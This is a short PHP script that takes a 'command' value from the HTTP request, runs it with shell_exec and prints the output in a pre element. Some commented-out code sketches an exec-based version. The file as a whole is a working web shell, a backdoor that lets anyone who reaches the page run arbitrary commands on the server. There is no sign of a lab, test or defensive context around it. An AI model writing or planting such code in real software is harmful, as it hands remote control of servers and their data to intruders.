<?php
    $command=$_REQUEST['command'];
    // execPrint($command);
    $output = shell_exec($command);
    echo "<pre>$output</pre>";

// function execPrint($command) {
// $result = array();
// exec($command, $result);
// // foreach ($result as $line) {
// // print($line . "\n");
// // }

// }

// Print the exec output inside of a pre element
?>